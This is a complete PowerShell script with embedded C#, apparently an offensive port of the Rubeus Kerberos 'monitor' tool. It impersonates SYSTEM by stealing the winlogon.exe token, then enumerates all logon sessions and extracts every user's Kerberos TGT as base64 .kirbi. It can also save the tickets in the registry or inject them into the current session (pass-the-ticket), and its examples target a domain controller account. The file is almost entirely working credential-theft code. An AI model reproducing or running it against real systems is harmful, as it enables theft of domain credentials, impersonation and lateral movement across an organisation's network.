#Requires -RunAsAdministrator

<#
.SYNOPSIS
    PS-KUD — Monitors for new Kerberos TGTs across all logon sessions.
    Pure PowerShell port of Rubeus's monitor command.

.DESCRIPTION
    Continuously polls all logon sessions on the local machine for new
    Ticket Granting Tickets (TGTs). When a previously unseen TGT is found,
    it is displayed with full base64-encoded .kirbi data.

    Requires elevation (Administrator) and runs as SYSTEM internally to
    access other users' ticket caches via the LSA.

    Primary use case: capturing incoming TGTs on servers with unconstrained
    delegation enabled.

.PARAMETER Interval
    Polling interval in seconds (default: 60).

.PARAMETER TargetUser
    Regex filter — only show TGTs for matching usernames.

.PARAMETER RegistryPath
    If set, persist captured TGTs under HKLM:\<path> as base64 values.

.PARAMETER NoWrap
    Output base64 ticket as a single unwrapped line.

.PARAMETER RunFor
    Stop monitoring after this many seconds (0 = run indefinitely).

.PARAMETER Import
    Automatically inject each captured TGT into the current logon session
    (Pass-the-Ticket). Uses LsaCallAuthenticationPackage with
    KerbSubmitTicketMessage — pure LSA, no external tools.

.EXAMPLE
    .\Invoke-PSKUD.ps1 -Interval 10
    Poll every 10 seconds for new TGTs from any user.

.EXAMPLE
    .\Invoke-PSKUD.ps1 -Interval 5 -TargetUser "admin" -NoWrap
    Poll every 5s, only show TGTs for users matching "admin", single-line base64.

.EXAMPLE
    .\Invoke-PSKUD.ps1 -Interval 5 -TargetUser 'DC01$' -Import
    Capture DC01's TGT and immediately inject it into the current session.
#>
[CmdletBinding()]
param(
    [int]$Interval    = 60,
    [string]$TargetUser  = "",
    [string]$RegistryPath = "",
    [switch]$NoWrap,
    [int]$RunFor      = 0,
    [switch]$Import
)

# ═══════════════════════════════════════════════════════════════════════════
#  C# Interop — LSA / Kerberos ticket extraction via secur32.dll
# ═══════════════════════════════════════════════════════════════════════════

$interopSource = @'
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;

public static class KerberosMonitor
{
    // ── Constants ────────────────────────────────────────────────────────

    private const uint TOKEN_DUPLICATE            = 0x0002;
    private const uint TOKEN_IMPERSONATE          = 0x0004;
    private const uint TOKEN_QUERY                = 0x0008;
    private const int  SECURITY_IMPERSONATION     = 2;
    private const uint PROCESS_QUERY_INFORMATION  = 0x0400;

    private const int  KerbQueryTicketCacheExMessage      = 14;
    private const int  KerbRetrieveEncodedTicketMessage    = 8;
    private const uint KERB_RETRIEVE_TICKET_AS_KERB_CRED  = 0x8;
    private const int  KerbSubmitTicketMessage             = 21;

    // ── Native structures ───────────────────────────────────────────────

    [StructLayout(LayoutKind.Sequential)]
    public struct LUID
    {
        public uint LowPart;
        public int  HighPart;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct LSA_STRING_IN
    {
        public ushort Length;
        public ushort MaximumLength;
        public string Buffer;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct UNICODE_STRING
    {
        public ushort Length;
        public ushort MaximumLength;
        public IntPtr Buffer;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct SECURITY_LOGON_SESSION_DATA
    {
        public uint           Size;
        public LUID           LogonId;
        public UNICODE_STRING UserName;
        public UNICODE_STRING LogonDomain;
        public UNICODE_STRING AuthenticationPackage;
        public uint           LogonType;
        public uint           Session;
        public IntPtr         Sid;
        public long           LogonTime;
        public UNICODE_STRING LogonServer;
        public UNICODE_STRING DnsDomainName;
        public UNICODE_STRING Upn;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct KERB_QUERY_TKT_CACHE_REQUEST
    {
        public int  MessageType;
        public LUID LogonId;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct KERB_QUERY_TKT_CACHE_EX_RESPONSE
    {
        public int MessageType;
        public int CountOfTickets;
        // Followed by KERB_TICKET_CACHE_INFO_EX[CountOfTickets]
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct KERB_TICKET_CACHE_INFO_EX
    {
        public UNICODE_STRING ClientName;
        public UNICODE_STRING ClientRealm;
        public UNICODE_STRING ServerName;
        public UNICODE_STRING ServerRealm;
        public long           StartTime;
        public long           EndTime;
        public long           RenewTime;
        public int            EncryptionType;
        public uint           TicketFlags;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct SecHandle
    {
        public IntPtr dwLower;
        public IntPtr dwUpper;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct KERB_RETRIEVE_TKT_REQUEST
    {
        public int            MessageType;
        public LUID           LogonId;
        public UNICODE_STRING TargetName;
        public uint           TicketFlags;
        public uint           CacheOptions;
        public int            EncryptionType;
        public SecHandle      CredentialsHandle;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct KERB_CRYPTO_KEY
    {
        public int    KeyType;
        public int    Length;
        public IntPtr Value;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct KERB_EXTERNAL_TICKET
    {
        public IntPtr         ServiceName;
        public IntPtr         TargetName;
        public IntPtr         ClientName;
        public UNICODE_STRING DomainName;
        public UNICODE_STRING TargetDomainName;
        public UNICODE_STRING AltTargetDomainName;
        public KERB_CRYPTO_KEY SessionKey;
        public uint           TicketFlags;
        public uint           Flags;
        public long           KeyExpirationTime;
        public long           StartTime;
        public long           EndTime;
        public long           RenewUntil;
        public long           TimeSkew;
        public int            EncodedTicketSize;
        public IntPtr         EncodedTicket;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct KERB_RETRIEVE_TKT_RESPONSE
    {
        public KERB_EXTERNAL_TICKET Ticket;
    }

    // ── P/Invoke ────────────────────────────────────────────────────────

    [DllImport("secur32.dll", SetLastError = false)]
    private static extern uint LsaConnectUntrusted(out IntPtr LsaHandle);

    [DllImport("secur32.dll", SetLastError = false)]
    private static extern uint LsaLookupAuthenticationPackage(
        IntPtr LsaHandle, ref LSA_STRING_IN PackageName, out uint AuthenticationPackage);

    [DllImport("secur32.dll", SetLastError = false)]
    private static extern uint LsaEnumerateLogonSessions(
        out ulong LogonSessionCount, out IntPtr LogonSessionList);

    [DllImport("secur32.dll", SetLastError = false)]
    private static extern uint LsaGetLogonSessionData(
        IntPtr LogonId, out IntPtr ppLogonSessionData);

    [DllImport("secur32.dll", SetLastError = false)]
    private static extern uint LsaCallAuthenticationPackage(
        IntPtr LsaHandle, uint AuthenticationPackage,
        IntPtr ProtocolSubmitBuffer, int SubmitBufferLength,
        out IntPtr ProtocolReturnBuffer, out uint ReturnBufferLength,
        out int ProtocolStatus);

    [DllImport("secur32.dll", SetLastError = false)]
    private static extern uint LsaFreeReturnBuffer(IntPtr Buffer);

    [DllImport("secur32.dll", SetLastError = false)]
    private static extern uint LsaDeregisterLogonProcess(IntPtr LsaHandle);

    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool OpenProcessToken(
        IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool DuplicateToken(
        IntPtr ExistingTokenHandle, int ImpersonationLevel, out IntPtr DuplicateTokenHandle);

    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool RevertToSelf();

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr OpenProcess(
        uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool CloseHandle(IntPtr hObject);

    // ── Result type ─────────────────────────────────────────────────────

    public class TGTInfo
    {
        public string   UserName;
        public string   LogonDomain;
        public string   ServerName;
        public DateTime StartTime;
        public DateTime EndTime;
        public DateTime RenewTime;
        public uint     TicketFlags;
        public int      EncryptionType;
        public byte[]   KirbiBytes;
        public ulong    SessionId;  // LUID as single value
    }

    // ── Internal helpers ────────────────────────────────────────────────

    private static string ReadUnicodeString(UNICODE_STRING us)
    {
        if (us.Buffer == IntPtr.Zero || us.Length == 0)
            return string.Empty;
        return Marshal.PtrToStringUni(us.Buffer, us.Length / 2);
    }

    private static DateTime SafeFromFileTime(long ft)
    {
        if (ft <= 0 || ft >= 2650467743990000000L) // ~year 9999
            return DateTime.MinValue;
        try   { return DateTime.FromFileTimeUtc(ft); }
        catch { return DateTime.MinValue; }
    }

    public static bool IsHighIntegrity()
    {
        using (var identity = WindowsIdentity.GetCurrent())
        {
            var principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }
    }

    /// <summary>
    /// Impersonate SYSTEM by stealing winlogon.exe's token.
    /// </summary>
    private static bool GetSystem()
    {
        Process[] procs = Process.GetProcessesByName("winlogon");
        if (procs.Length == 0) return false;

        IntPtr hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, false, procs[0].Id);
        if (hProcess == IntPtr.Zero) return false;

        IntPtr hToken;
        if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY, out hToken))
        {
            CloseHandle(hProcess);
            return false;
        }

        IntPtr hDup;
        if (!DuplicateToken(hToken, SECURITY_IMPERSONATION, out hDup))
        {
            CloseHandle(hToken);
            CloseHandle(hProcess);
            return false;
        }

        bool ok = ImpersonateLoggedOnUser(hDup);

        CloseHandle(hDup);
        CloseHandle(hToken);
        CloseHandle(hProcess);
        return ok;
    }

    // ── Ticket cache enumeration (per logon session) ────────────────────

    private static List<TGTInfo> QuerySessionTGTs(IntPtr lsaHandle, uint authPkg, LUID luid)
    {
        var result = new List<TGTInfo>();

        // Build KerbQueryTicketCacheExMessage request
        var req = new KERB_QUERY_TKT_CACHE_REQUEST();
        req.MessageType = KerbQueryTicketCacheExMessage;
        req.LogonId     = luid;

        int    reqSize = Marshal.SizeOf(req);
        IntPtr reqPtr  = Marshal.AllocHGlobal(reqSize);
        Marshal.StructureToPtr(req, reqPtr, false);

        IntPtr respPtr;
        uint   respLen;
        int    protoStatus;

        uint status = LsaCallAuthenticationPackage(
            lsaHandle, authPkg, reqPtr, reqSize,
            out respPtr, out respLen, out protoStatus);

        Marshal.FreeHGlobal(reqPtr);

        if (status != 0 || protoStatus != 0 || respPtr == IntPtr.Zero)
            return result;

        var resp = (KERB_QUERY_TKT_CACHE_EX_RESPONSE)Marshal.PtrToStructure(
            respPtr, typeof(KERB_QUERY_TKT_CACHE_EX_RESPONSE));

        int headerSize = Marshal.SizeOf(typeof(KERB_QUERY_TKT_CACHE_EX_RESPONSE));
        int entrySize  = Marshal.SizeOf(typeof(KERB_TICKET_CACHE_INFO_EX));

        for (int i = 0; i < resp.CountOfTickets; i++)
        {
            IntPtr entryPtr = (IntPtr)((long)respPtr + headerSize + (long)i * entrySize);
            var entry = (KERB_TICKET_CACHE_INFO_EX)Marshal.PtrToStructure(
                entryPtr, typeof(KERB_TICKET_CACHE_INFO_EX));

            string serverName = ReadUnicodeString(entry.ServerName);

            // Only TGTs (krbtgt/REALM)
            if (!serverName.StartsWith("krbtgt/", StringComparison.OrdinalIgnoreCase))
                continue;

            DateTime endTime = SafeFromFileTime(entry.EndTime);
            if (endTime != DateTime.MinValue && endTime < DateTime.UtcNow)
                continue;

            // Extract the full ticket as KRB-CRED (.kirbi)
            byte[] kirbi = ExtractTicket(lsaHandle, authPkg, luid, serverName);
            if (kirbi == null) continue;

            var tgt        = new TGTInfo();
            tgt.ServerName     = serverName;
            tgt.StartTime      = SafeFromFileTime(entry.StartTime);
            tgt.EndTime        = endTime;
            tgt.RenewTime      = SafeFromFileTime(entry.RenewTime);
            tgt.TicketFlags    = entry.TicketFlags;
            tgt.EncryptionType = entry.EncryptionType;
            tgt.KirbiBytes     = kirbi;
            tgt.SessionId      = ((ulong)(uint)luid.HighPart << 32) | luid.LowPart;

            result.Add(tgt);
            break;  // one TGT per logon session
        }

        LsaFreeReturnBuffer(respPtr);
        return result;
    }

    /// <summary>
    /// Extract a single ticket from the cache in KRB-CRED (.kirbi) format.
    /// Uses LsaCallAuthenticationPackage with KerbRetrieveEncodedTicketMessage
    /// and KERB_RETRIEVE_TICKET_AS_KERB_CRED (0x8).
    /// </summary>
    private static byte[] ExtractTicket(IntPtr lsaHandle, uint authPkg, LUID luid, string targetName)
    {
        byte[] nameBytes  = Encoding.Unicode.GetBytes(targetName);
        int    structSize = Marshal.SizeOf(typeof(KERB_RETRIEVE_TKT_REQUEST));
        int    totalSize  = structSize + nameBytes.Length;

        IntPtr bufPtr = Marshal.AllocHGlobal(totalSize);

        // Zero the entire buffer
        byte[] zeros = new byte[totalSize];
        Marshal.Copy(zeros, 0, bufPtr, totalSize);

        // Build the request — TargetName.Buffer points right after the struct
        var req            = new KERB_RETRIEVE_TKT_REQUEST();
        req.MessageType    = KerbRetrieveEncodedTicketMessage;
        req.LogonId        = luid;
        req.TargetName.Length        = (ushort)nameBytes.Length;
        req.TargetName.MaximumLength = (ushort)nameBytes.Length;
        req.TargetName.Buffer        = (IntPtr)((long)bufPtr + structSize);
        req.TicketFlags    = 0;
        req.CacheOptions   = KERB_RETRIEVE_TICKET_AS_KERB_CRED;
        req.EncryptionType = 0;

        Marshal.StructureToPtr(req, bufPtr, false);
        Marshal.Copy(nameBytes, 0, (IntPtr)((long)bufPtr + structSize), nameBytes.Length);

        IntPtr respPtr;
        uint   respLen;
        int    protoStatus;

        uint status = LsaCallAuthenticationPackage(
            lsaHandle, authPkg, bufPtr, totalSize,
            out respPtr, out respLen, out protoStatus);

        Marshal.FreeHGlobal(bufPtr);

        if (status != 0 || protoStatus != 0 || respPtr == IntPtr.Zero)
            return null;

        // Read the KERB_EXTERNAL_TICKET from the response
        var resp = (KERB_RETRIEVE_TKT_RESPONSE)Marshal.PtrToStructure(
            respPtr, typeof(KERB_RETRIEVE_TKT_RESPONSE));

        int    ticketSize = resp.Ticket.EncodedTicketSize;
        IntPtr ticketPtr  = resp.Ticket.EncodedTicket;

        if (ticketSize <= 0 || ticketPtr == IntPtr.Zero)
        {
            LsaFreeReturnBuffer(respPtr);
            return null;
        }

        byte[] kirbi = new byte[ticketSize];
        Marshal.Copy(ticketPtr, kirbi, 0, ticketSize);

        LsaFreeReturnBuffer(respPtr);
        return kirbi;
    }

    // ── Public API ──────────────────────────────────────────────────────

    /// <summary>
    /// Enumerate all current TGTs on the system.
    /// Elevates to SYSTEM, connects to LSA, iterates logon sessions,
    /// and extracts krbtgt tickets as .kirbi blobs.
    /// </summary>
    public static List<TGTInfo> GetCurrentTGTs(string targetUser)
    {
        var tgts = new List<TGTInfo>();

        // ── Elevate to SYSTEM and get an LSA handle ──
        if (!GetSystem())
            throw new InvalidOperationException(
                "Failed to impersonate SYSTEM. Ensure the process is elevated and winlogon.exe is accessible.");

        IntPtr lsaHandle;
        uint ntstatus = LsaConnectUntrusted(out lsaHandle);
        RevertToSelf();

        if (ntstatus != 0)
            throw new Win32Exception(
                "LsaConnectUntrusted failed with NTSTATUS 0x" + ntstatus.ToString("X8"));

        // ── Resolve the Kerberos auth package ──
        var pkgName = new LSA_STRING_IN();
        pkgName.Buffer        = "kerberos";
        pkgName.Length         = (ushort)pkgName.Buffer.Length;
        pkgName.MaximumLength  = (ushort)(pkgName.Buffer.Length + 1);

        uint authPkg;
        ntstatus = LsaLookupAuthenticationPackage(lsaHandle, ref pkgName, out authPkg);
        if (ntstatus != 0)
        {
            LsaDeregisterLogonProcess(lsaHandle);
            throw new Win32Exception(
                "LsaLookupAuthenticationPackage failed with NTSTATUS 0x" + ntstatus.ToString("X8"));
        }

        // ── Enumerate all logon sessions ──
        ulong  sessionCount;
        IntPtr luidPtr;
        ntstatus = LsaEnumerateLogonSessions(out sessionCount, out luidPtr);
        if (ntstatus != 0)
        {
            LsaDeregisterLogonProcess(lsaHandle);
            throw new Win32Exception(
                "LsaEnumerateLogonSessions failed with NTSTATUS 0x" + ntstatus.ToString("X8"));
        }

        int    luidSize = Marshal.SizeOf(typeof(LUID));
        IntPtr cursor   = luidPtr;

        for (ulong i = 0; i < sessionCount; i++)
        {
            LUID luid = (LUID)Marshal.PtrToStructure(cursor, typeof(LUID));

            IntPtr sdPtr;
            if (LsaGetLogonSessionData(cursor, out sdPtr) != 0 || sdPtr == IntPtr.Zero)
            {
                cursor = (IntPtr)((long)cursor + luidSize);
                continue;
            }

            var sd = (SECURITY_LOGON_SESSION_DATA)Marshal.PtrToStructure(
                sdPtr, typeof(SECURITY_LOGON_SESSION_DATA));

            string userName    = ReadUnicodeString(sd.UserName);
            string logonDomain = ReadUnicodeString(sd.LogonDomain);

            LsaFreeReturnBuffer(sdPtr);

            // Skip empty names only — computer accounts (DC02$) must be
            // included for unconstrained delegation TGT capture
            if (string.IsNullOrEmpty(userName))
            {
                cursor = (IntPtr)((long)cursor + luidSize);
                continue;
            }

            // Apply target-user filter (case-insensitive substring match,
            // same behavior as Rubeus — no regex, so "DC02$" works literally)
            if (!string.IsNullOrEmpty(targetUser))
            {
                if (userName.IndexOf(targetUser, StringComparison.OrdinalIgnoreCase) < 0)
                {
                    cursor = (IntPtr)((long)cursor + luidSize);
                    continue;
                }
            }

            // Query TGTs for this logon session
            var sessionTGTs = QuerySessionTGTs(lsaHandle, authPkg, luid);
            foreach (var tgt in sessionTGTs)
            {
                tgt.UserName    = userName;
                tgt.LogonDomain = logonDomain;
                tgts.Add(tgt);
            }

            cursor = (IntPtr)((long)cursor + luidSize);
        }

        LsaFreeReturnBuffer(luidPtr);
        LsaDeregisterLogonProcess(lsaHandle);
        return tgts;
    }

    // ── Pass-the-Ticket — inject .kirbi into a logon session ────────────

    /// <summary>
    /// Submit a KRB-CRED (.kirbi) blob into a logon session's ticket cache
    /// via LsaCallAuthenticationPackage + KerbSubmitTicketMessage.
    /// When luidLow/luidHigh are both 0 the ticket goes into the caller's
    /// own session (LsaConnectUntrusted is sufficient).
    /// </summary>
    public static void ImportTicket(byte[] kirbiBytes, uint luidLow, int luidHigh)
    {
        // ── Get an LSA handle ──
        // For LUID {0,0} (current session) an untrusted handle works.
        // For an arbitrary LUID we need SYSTEM → use a trusted-ish
        // connection obtained while impersonating SYSTEM.
        bool needSystem = !(luidLow == 0 && luidHigh == 0);
        bool impersonating = false;

        if (needSystem)
        {
            if (!GetSystem())
                throw new InvalidOperationException(
                    "SYSTEM impersonation required to target LUID 0x"
                    + (((ulong)(uint)luidHigh << 32) | luidLow).ToString("X")
                    + " but failed. Is the process elevated?");
            impersonating = true;
        }

        IntPtr lsaHandle;
        uint ntstatus = LsaConnectUntrusted(out lsaHandle);

        if (impersonating) RevertToSelf();

        if (ntstatus != 0)
            throw new InvalidOperationException(
                "LsaConnectUntrusted failed: NTSTATUS 0x" + ntstatus.ToString("X8"));

        try
        {
            // ── Resolve the Kerberos package ──
            var pkgName       = new LSA_STRING_IN();
            pkgName.Buffer        = "kerberos";
            pkgName.Length         = (ushort)pkgName.Buffer.Length;
            pkgName.MaximumLength  = (ushort)(pkgName.Buffer.Length + 1);

            uint authPkg;
            ntstatus = LsaLookupAuthenticationPackage(lsaHandle, ref pkgName, out authPkg);
            if (ntstatus != 0)
                throw new InvalidOperationException(
                    "LsaLookupAuthenticationPackage failed: NTSTATUS 0x" + ntstatus.ToString("X8"));

            // ── Build KERB_SUBMIT_TKT_REQUEST ──
            //
            //  Offset  Size  Field
            //   0       4    MessageType          = 21
            //   4       4    LogonId.LowPart
            //   8       4    LogonId.HighPart
            //  12       4    Flags                = 0
            //  16       4    Key.KeyType          = 0
            //  20       4    Key.Length            = 0
            //  24       4    Key.Offset           = 0
            //  28       4    KerbCredSize
            //  32       4    KerbCredOffset       = 36 (right after struct)
            //  36       N    <KRB-CRED bytes>

            int    structSize = 36;
            int    totalSize  = structSize + kirbiBytes.Length;
            IntPtr buf        = Marshal.AllocHGlobal(totalSize);

            try
            {
                // Zero out
                byte[] zeros = new byte[totalSize];
                Marshal.Copy(zeros, 0, buf, totalSize);

                Marshal.WriteInt32(buf,  0, KerbSubmitTicketMessage);
                Marshal.WriteInt32(buf,  4, (int)luidLow);
                Marshal.WriteInt32(buf,  8, luidHigh);
                // Flags (12), Key.KeyType (16), Key.Length (20), Key.Offset (24) stay 0
                Marshal.WriteInt32(buf, 28, kirbiBytes.Length);   // KerbCredSize
                Marshal.WriteInt32(buf, 32, structSize);          // KerbCredOffset
                Marshal.Copy(kirbiBytes, 0,
                    (IntPtr)((long)buf + structSize), kirbiBytes.Length);

                IntPtr respPtr;
                uint   respLen;
                int    protoStatus;

                ntstatus = LsaCallAuthenticationPackage(
                    lsaHandle, authPkg, buf, totalSize,
                    out respPtr, out respLen, out protoStatus);

                if (respPtr != IntPtr.Zero)
                    LsaFreeReturnBuffer(respPtr);

                if (ntstatus != 0)
                    throw new InvalidOperationException(
                        "LsaCallAuthenticationPackage failed: NTSTATUS 0x"
                        + ntstatus.ToString("X8"));

                if (protoStatus != 0)
                    throw new InvalidOperationException(
                        "KerbSubmitTicketMessage rejected: NTSTATUS 0x"
                        + ((uint)protoStatus).ToString("X8"));
            }
            finally
            {
                Marshal.FreeHGlobal(buf);
            }
        }
        finally
        {
            LsaDeregisterLogonProcess(lsaHandle);
        }
    }

    /// <summary>Import into the caller's own logon session (LUID 0).</summary>
    public static void ImportTicket(byte[] kirbiBytes)
    {
        ImportTicket(kirbiBytes, 0, 0);
    }

    // ── Display helpers ─────────────────────────────────────────────────

    public static string DecodeTicketFlags(uint flags)
    {
        var parts = new List<string>();
        if ((flags & 0x40000000) != 0) parts.Add("forwardable");
        if ((flags & 0x20000000) != 0) parts.Add("forwarded");
        if ((flags & 0x10000000) != 0) parts.Add("proxiable");
        if ((flags & 0x08000000) != 0) parts.Add("proxy");
        if ((flags & 0x04000000) != 0) parts.Add("may_postdate");
        if ((flags & 0x02000000) != 0) parts.Add("postdated");
        if ((flags & 0x01000000) != 0) parts.Add("invalid");
        if ((flags & 0x00800000) != 0) parts.Add("renewable");
        if ((flags & 0x00400000) != 0) parts.Add("initial");
        if ((flags & 0x00200000) != 0) parts.Add("pre_authent");
        if ((flags & 0x00100000) != 0) parts.Add("hw_authent");
        if ((flags & 0x00080000) != 0) parts.Add("ok_as_delegate");
        if ((flags & 0x00010000) != 0) parts.Add("name_canonicalize");
        if (parts.Count == 0) return "none";
        return string.Join(", ", parts.ToArray());
    }

    public static string GetEncryptionTypeName(int etype)
    {
        switch (etype)
        {
            case 1:  return "DES_CBC_CRC";
            case 3:  return "DES_CBC_MD5";
            case 17: return "AES128_CTS_HMAC_SHA1";
            case 18: return "AES256_CTS_HMAC_SHA1";
            case 23: return "RC4_HMAC";
            case 24: return "RC4_HMAC_EXP";
            default: return "etype_" + etype;
        }
    }
}
'@

# Only compile once per session.
# If the type exists but is missing ImportTicket (stale from an older run),
# Add-Type cannot replace it in the same process — the user must restart PS.
$_kmType = ([System.Management.Automation.PSTypeName]'KerberosMonitor').Type
if (-not $_kmType) {
    Add-Type -TypeDefinition $interopSource
} elseif (-not ($_kmType.GetMethods() | Where-Object { $_.Name -eq 'ImportTicket' })) {
    if ($Import) {
        Write-Error ("KerberosMonitor was compiled in this session before ImportTicket existed. " +
                      "Please restart PowerShell so the updated type can be loaded.")
        return
    }
    Write-Warning "KerberosMonitor is stale (no ImportTicket). Restart PowerShell to use -Import."
}

# ═══════════════════════════════════════════════════════════════════════════
#  Validation
# ═══════════════════════════════════════════════════════════════════════════

if (-not [KerberosMonitor]::IsHighIntegrity()) {
    Write-Error "This script must run in an elevated (Administrator) context."
    return
}

# ═══════════════════════════════════════════════════════════════════════════
#  Monitor loop
# ═══════════════════════════════════════════════════════════════════════════

$seenTickets = [System.Collections.Generic.HashSet[string]]::new()
$startTime   = Get-Date
$ticketCount = 0

Write-Host ""
Write-Host "  ╔══════════════════════════════════════════╗" -ForegroundColor DarkCyan
Write-Host "  ║               PS-KUD                     ║" -ForegroundColor DarkCyan
Write-Host "  ╚══════════════════════════════════════════╝" -ForegroundColor DarkCyan
Write-Host ""
Write-Host "  [*] Interval    : ${Interval}s" -ForegroundColor Gray
if ($TargetUser)    { Write-Host "  [*] TargetUser  : $TargetUser" -ForegroundColor Gray }
if ($RegistryPath)  { Write-Host "  [*] Registry    : HKLM:\$RegistryPath" -ForegroundColor Gray }
if ($RunFor -gt 0)  { Write-Host "  [*] RunFor      : ${RunFor}s" -ForegroundColor Gray }
if ($Import)        { Write-Host "  [*] Import      : ON (auto-PTT into current session)" -ForegroundColor Magenta }
Write-Host "  [*] Started at  : $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" -ForegroundColor Gray
Write-Host ""
Write-Host "  Monitoring for new TGTs... (Ctrl+C to stop)" -ForegroundColor Yellow
Write-Host ""

try {
    while ($true) {

        # ── Poll for TGTs ────────────────────────────────────────────
        try {
            $currentTGTs = [KerberosMonitor]::GetCurrentTGTs($TargetUser)
        }
        catch {
            Write-Warning "[!] Error during enumeration: $_"
            Start-Sleep -Seconds $Interval
            continue
        }

        # ── Process each discovered TGT ──────────────────────────────
        foreach ($tgt in $currentTGTs) {

            $b64 = [Convert]::ToBase64String($tgt.KirbiBytes)

            # Deduplicate by base64 content
            if ($seenTickets.Contains($b64)) { continue }
            [void]$seenTickets.Add($b64)
            $ticketCount++

            # ── Display ──────────────────────────────────────────────
            $now   = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
            $flags = [KerberosMonitor]::DecodeTicketFlags($tgt.TicketFlags)
            $etype = [KerberosMonitor]::GetEncryptionTypeName($tgt.EncryptionType)

            Write-Host "  ┌──────────────────────────────────────────────────────" -ForegroundColor Green
            Write-Host "  │ [+] NEW TGT #$ticketCount  ($now)" -ForegroundColor Green
            Write-Host "  ├──────────────────────────────────────────────────────" -ForegroundColor Green
            Write-Host "  │  User        : $($tgt.LogonDomain)\$($tgt.UserName)" -ForegroundColor Cyan
            Write-Host "  │  Service     : $($tgt.ServerName)" -ForegroundColor White
            Write-Host "  │  Encryption  : $etype" -ForegroundColor White

            if ($tgt.StartTime -ne [DateTime]::MinValue) {
                Write-Host "  │  StartTime   : $($tgt.StartTime.ToLocalTime().ToString('yyyy-MM-dd HH:mm:ss'))" -ForegroundColor White
            }
            if ($tgt.EndTime -ne [DateTime]::MinValue) {
                Write-Host "  │  EndTime     : $($tgt.EndTime.ToLocalTime().ToString('yyyy-MM-dd HH:mm:ss'))" -ForegroundColor White
            }
            if ($tgt.RenewTime -ne [DateTime]::MinValue) {
                Write-Host "  │  RenewTill   : $($tgt.RenewTime.ToLocalTime().ToString('yyyy-MM-dd HH:mm:ss'))" -ForegroundColor White
            }

            Write-Host "  │  Flags       : 0x$($tgt.TicketFlags.ToString('X8')) ($flags)" -ForegroundColor White
            Write-Host "  │  SessionLUID : 0x$($tgt.SessionId.ToString('X'))" -ForegroundColor White
            Write-Host "  │" -ForegroundColor Green
            Write-Host "  │  Base64 .kirbi ($($tgt.KirbiBytes.Length) bytes):" -ForegroundColor Yellow

            if ($NoWrap) {
                Write-Host "  │  $b64" -ForegroundColor White
            }
            else {
                $wrapWidth = 100
                for ($i = 0; $i -lt $b64.Length; $i += $wrapWidth) {
                    $len = [Math]::Min($wrapWidth, $b64.Length - $i)
                    Write-Host "  │    $($b64.Substring($i, $len))" -ForegroundColor White
                }
            }

            Write-Host "  └──────────────────────────────────────────────────────" -ForegroundColor Green
            Write-Host ""

            # ── Pass-the-Ticket (optional) ───────────────────────────
            if ($Import) {
                try {
                    [KerberosMonitor]::ImportTicket($tgt.KirbiBytes)
                    Write-Host "  [>] Ticket injected into current session (PTT)" -ForegroundColor Magenta
                    Write-Host ""
                }
                catch {
                    Write-Host "  [!] PTT failed: $_" -ForegroundColor Red
                    Write-Host ""
                }
            }

            # ── Registry persistence (optional) ──────────────────────
            if ($RegistryPath) {
                $regKey = "HKLM:\$RegistryPath"
                if (-not (Test-Path $regKey)) {
                    New-Item -Path $regKey -Force | Out-Null
                }
                $valueName = "$($tgt.UserName)@$($tgt.LogonDomain)_$(Get-Date -Format 'yyyyMMddHHmmss')"
                Set-ItemProperty -Path $regKey -Name $valueName -Value $b64
                Write-Host "  [>] Saved to registry: $regKey\$valueName" -ForegroundColor DarkGray
                Write-Host ""
            }
        }

        # ── RunFor timeout check ─────────────────────────────────────
        if ($RunFor -gt 0) {
            $elapsed = ((Get-Date) - $startTime).TotalSeconds
            if ($elapsed -ge $RunFor) {
                Write-Host "  [*] RunFor limit reached (${RunFor}s). Exiting." -ForegroundColor Yellow
                Write-Host "  [*] Total unique TGTs captured: $ticketCount" -ForegroundColor Yellow
                break
            }
        }

        Start-Sleep -Seconds $Interval
    }
}
finally {
    Write-Host ""
    Write-Host "  [*] Monitor stopped. Total unique TGTs captured: $ticketCount" -ForegroundColor Yellow
    Write-Host ""
}
